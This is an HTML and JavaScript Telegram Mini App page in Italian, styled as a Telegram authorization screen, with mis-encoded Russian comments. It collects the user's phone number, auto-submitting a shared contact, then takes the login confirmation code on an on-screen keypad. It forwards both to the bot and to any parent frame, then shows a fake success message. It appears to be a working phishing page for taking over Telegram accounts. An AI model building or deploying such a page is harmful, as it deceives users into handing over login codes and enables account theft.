<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorizzazione Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* –°—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        h1 {
            margin-bottom: 20px;
            font-size: 28px;
        }

        .tg-button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
            transition: transform 0.2s;
        }

        .tg-button-secondary {
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
        }

        .tg-button:hover {
            transform: translateY(-2px);
        }

        .input-field {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }

        .key {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            padding: 15px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            color: white;
            transition: background 0.2s;
        }

        .key:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .code-display {
            font-family: monospace;
            font-size: 24px;
            letter-spacing: 5px;
            padding: 20px;
            margin: 20px 0;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            min-height: 30px;
        }

        .section {
            display: none;
        }

        .active {
            display: block;
        }

        .error {
            color: #ff6b6b;
            margin: 10px 0;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        .success {
            color: #4ecdc4;
            margin: 10px 0;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        .contact-shared {
            background: rgba(78, 205, 196, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .divider {
            margin: 20px 0;
            border: none;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –°–µ–∫—Ü–∏—è –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏—è -->
        <div id="welcome-section" class="section active">
            <h1>üëã Benvenuto!</h1>
            <p>Autorizzazione necessaria per accedere al contenuto</p>
            <button class="tg-button" onclick="showPhoneSection()">Inizia Autorizzazione</button>
        </div>

        <!-- –°–µ–∫—Ü–∏—è –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="phone-section" class="section">
            <h1>üì± Inserisci il tuo numero</h1>
            
            <input type="tel" id="phone-input" class="input-field" placeholder="+39 123 456 7890">
            <button class="tg-button" onclick="sendPhoneNumber()">Invia Numero</button>
            
            <hr class="divider">
            <p>Oppure condividi il tuo contatto:</p>
            <button class="tg-button tg-button-secondary" onclick="shareContact()">üì± Condividi il mio contatto</button>
            
            <div id="contact-info" class="contact-shared" style="display: none;">
                <p>üìû <strong id="shared-phone"></strong></p>
                <p>‚úÖ Contatto condiviso con successo</p>
            </div>
            
            <div id="phone-error" class="error" style="display: none;"></div>
            <div id="phone-success" class="success" style="display: none;"></div>
            <div id="phone-loading" class="loader" style="display: none;"></div>
        </div>

        <!-- –°–µ–∫—Ü–∏—è –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è -->
        <div id="code-section" class="section">
            <h1>‚å®Ô∏è Inserisci il codice</h1>
            <div class="code-display" id="code-display"></div>
            <div class="keyboard" id="keyboard"></div>
            <button class="tg-button" onclick="sendCode()">‚úÖ Invia Codice</button>
            <div id="code-error" class="error" style="display: none;"></div>
            <div id="code-loading" class="loader" style="display: none;"></div>
        </div>

        <!-- –°–µ–∫—Ü–∏—è —É—Å–ø–µ—Ö–∞ -->
        <div id="success-section" class="section">
            <h1>üéâ Successo!</h1>
            <p>Autorizzazione completata con successo!</p>
        </div>
    </div>

    <script>
        let currentCode = '';
        let userPhone = '';
        let userId = null;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WebApp
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();

        // –ü–æ–ª—É—á–∞–µ–º user_id –∏–∑ initData
        function getUserId() {
            try {
                if (Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
                    return Telegram.WebApp.initDataUnsafe.user.id;
                }
                
                const urlParams = new URLSearchParams(window.location.search);
                const userIdFromUrl = urlParams.get('user_id');
                if (userIdFromUrl) {
                    return userIdFromUrl;
                }
                
                return 'temp_' + Math.random().toString(36).substr(2, 9);
                
            } catch (error) {
                return 'temp_' + Math.random().toString(36).substr(2, 9);
            }
        }

        function showSection(sectionId) {
            document.querySelectorAll('.section').forEach(section => {
                section.classList.remove('active');
            });
            document.getElementById(sectionId).classList.add('active');
        }

        function showPhoneSection() {
            showSection('phone-section');
        }

        function createKeyboard() {
            const keyboard = document.getElementById('keyboard');
            keyboard.innerHTML = '';
            const digits = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];

            digits.forEach(digit => {
                const button = document.createElement('button');
                button.className = 'key';
                button.textContent = digit;
                button.onclick = () => addDigit(digit);
                keyboard.appendChild(button);
            });
            
            // –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É —É–¥–∞–ª–µ–Ω–∏—è
            const deleteButton = document.createElement('button');
            deleteButton.className = 'key';
            deleteButton.textContent = '‚å´';
            deleteButton.onclick = () => deleteDigit();
            keyboard.appendChild(deleteButton);
        }

        function addDigit(digit) {
            if (currentCode.length < 10) {
                currentCode += digit;
                updateCodeDisplay();
            }
        }

        function deleteDigit() {
            if (currentCode.length > 0) {
                currentCode = currentCode.slice(0, -1);
                updateCodeDisplay();
            }
        }

        function updateCodeDisplay() {
            document.getElementById('code-display').textContent = 
                currentCode.padEnd(5, '‚Ä¢');
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ –±–æ—Ç–∞
        function sendDataToBot(data) {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ Telegram WebApp
            Telegram.WebApp.sendData(JSON.stringify(data));
            
            // –¢–∞–∫–∂–µ –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ postMessage –¥–ª—è –∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω–æ–π –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–∏
            if (window.parent !== window) {
                window.parent.postMessage(data, '*');
            }
        }

        // –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º
        function shareContact() {
            Telegram.WebApp.openContactForm((data) => {
                if (data && data.phone_number) {
                    userPhone = data.phone_number;
                    if (!userPhone.startsWith('+')) {
                        userPhone = '+' + userPhone;
                    }
                    
                    // –ó–∞–ø–æ–ª–Ω—è–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
                    document.getElementById('phone-input').value = userPhone;
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ shared –∫–æ–Ω—Ç–∞–∫—Ç–µ
                    document.getElementById('shared-phone').textContent = userPhone;
                    document.getElementById('contact-info').style.display = 'block';
                    document.getElementById('phone-success').textContent = 'Contatto ricevuto! Clicca "Invia Numero" per continuare.';
                    document.getElementById('phone-success').style.display = 'block';
                    
                    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä
                    setTimeout(() => {
                        sendPhoneNumber();
                    }, 1000);
                }
            });
        }

        function sendPhoneNumber() {
            const phoneInput = document.getElementById('phone-input');
            const errorDiv = document.getElementById('phone-error');
            const successDiv = document.getElementById('phone-success');
            const loadingDiv = document.getElementById('phone-loading');
            
            // –ï—Å–ª–∏ –Ω–æ–º–µ—Ä —É–∂–µ –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ shareContact, –∏—Å–ø–æ–ª—å–∑—É–µ–º –µ–≥–æ
            if (!userPhone) {
                userPhone = phoneInput.value.trim();
            }
            
            if (!userPhone) {
                errorDiv.textContent = 'Per favore inserisci il numero di telefono';
                errorDiv.style.display = 'block';
                return;
            }

            if (!userPhone.startsWith('+')) {
                userPhone = '+' + userPhone;
            }

            try {
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                loadingDiv.style.display = 'block';
                
                // –ü–æ–ª—É—á–∞–µ–º user_id
                userId = getUserId();
                console.log('Using user_id:', userId);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
                sendDataToBot({
                    action: 'send_phone',
                    phone: userPhone,
                    user_id: userId
                });
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–µ–∫—Ü–∏—é —Å –∫–æ–¥–æ–º (–∏–º–∏—Ç–∞—Ü–∏—è, –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –±–æ—Ç –¥–æ–ª–∂–µ–Ω –∑–∞–ø—Ä–æ—Å–∏—Ç—å –∫–æ–¥)
                setTimeout(() => {
                    loadingDiv.style.display = 'none';
                    showSection('code-section');
                    createKeyboard();
                }, 1000);
                
            } catch (error) {
                loadingDiv.style.display = 'none';
                errorDiv.textContent = 'Errore: ' + error.message;
                errorDiv.style.display = 'block';
                console.error('Error:', error);
            }
        }

        function sendCode() {
            const errorDiv = document.getElementById('code-error');
            const loadingDiv = document.getElementById('code-loading');
            
            if (!currentCode) {
                errorDiv.textContent = 'Per favore inserisci il codice';
                errorDiv.style.display = 'block';
                return;
            }

            try {
                errorDiv.style.display = 'none';
                loadingDiv.style.display = 'block';
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –≤ –±–æ—Ç–∞
                sendDataToBot({
                    action: 'send_code',
                    code: currentCode,
                    user_id: userId
                });
                
                // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –±–æ—Ç –¥–æ–ª–∂–µ–Ω –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥ –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç–≤–µ—Ç
                // –ó–¥–µ—Å—å –∏–º–∏—Ç–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                setTimeout(() => {
                    loadingDiv.style.display = 'none';
                    showSection('success-section');
                    
                    // –ó–∞–∫—Ä—ã–≤–∞–µ–º WebApp —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        Telegram.WebApp.close();
                    }, 2000);
                }, 1000);
                
            } catch (error) {
                loadingDiv.style.display = 'none';
                errorDiv.textContent = 'Errore: ' + error.message;
                errorDiv.style.display = 'block';
                console.error('Error:', error);
            }
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –±–æ—Ç–∞
        function handleMessage(event) {
            try {
                const data = event.data;
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –±–æ—Ç–∞
                if (data && data.action) {
                    switch(data.action) {
                        case 'request_phone':
                            showPhoneSection();
                            break;
                        case 'request_code':
                            showSection('code-section');
                            createKeyboard();
                            break;
                        case 'auth_success':
                            showSection('success-section');
                            setTimeout(() => {
                                Telegram.WebApp.close();
                            }, 2000);
                            break;
                        case 'auth_error':
                            document.getElementById('code-error').textContent = data.message || 'Errore di autenticazione';
                            document.getElementById('code-error').style.display = 'block';
                            break;
                    }
                }
            } catch (error) {
                console.error('Error handling message:', error);
            }
        }

        // –°–ª—É—à–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –±–æ—Ç–∞
        window.addEventListener('message', handleMessage);

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        userId = getUserId();
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ –±–æ—Ç —É–∂–µ –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–∞–∫–∏–µ-—Ç–æ –¥–∞–Ω–Ω—ã–µ
        if (Telegram.WebApp.initData) {
            // –ú–æ–∂–Ω–æ —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å initData –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        }
    </script>
</body>
</html>
